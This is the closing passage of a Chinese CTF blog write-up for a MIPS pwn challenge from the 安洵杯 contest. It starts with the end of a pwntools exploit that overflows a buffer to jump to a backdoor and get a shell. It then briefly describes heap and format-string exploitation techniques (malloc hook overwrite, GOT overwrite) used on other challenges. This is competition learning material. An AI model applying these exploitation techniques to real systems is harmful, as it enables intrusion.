:io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda numb=4096          :io.recv(numb)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line">ru(&quot;What&apos;s your name?\n&quot;)</span><br><span class="line">sl(&apos;1&apos;*0x1c+pack(&quot;&lt;I&quot;,backdoor))</span><br><span class="line">ru(&quot;YaLeYaLeDaZe?(yaleyale/kotowalu)\n&quot;)</span><br><span class="line">s(&apos;1&apos;*8+pack(&quot;&lt;I&quot;,bss_name))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>







<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>调试的时候发现一个问题：gdb调试mips架构的时候，会$fp认成$s8。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200517024657.png" alt=""></p>
<p>本场比赛一共四道pwn题</p>
<p>做出来的题：</p>
<ul>
<li>一个堆题，跟之前做的某个题特别像。当时写的wp：利用格式化字符串漏洞泄露libc，构造overlap修改 global_max_fast ，然后就可以fastbinattack改 malloc hook 拿shell，但因为有大小限制，所以需要自己在 malloc hook 前填一个size位。</li>
<li>一个32位格式化字符串盲注，当时写的wp：先确定格式化字符串漏洞的偏移是8，dump出全部的程序后构造exp，利用方法是先泄露read的got表地址，然后改sprintf的got表地址为onegadget拿shell。</li>
</ul>
<p>未做出来的题：</p>
<ul>
<li>一个64位格式化字符串盲注，因为菜，所以时间不够。</li>
<li>这篇博客写的mips</li>
</ul>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2020-01-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/PWN/" title="PWN">PWN </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://q1iq.top/安洵杯-WP/,Q1IQ,安洵杯 MIPS,;" target="_blank" rel="noopener"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/vm-Pwn/" title="vm-Pwn">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/%E6%B9%96%E6%B9%98%E6%9D%AF-wp/" title="湖湘杯 wp">Próximo post</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":200,"height":400,"hOffset":400,"vOffset":0},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body></html>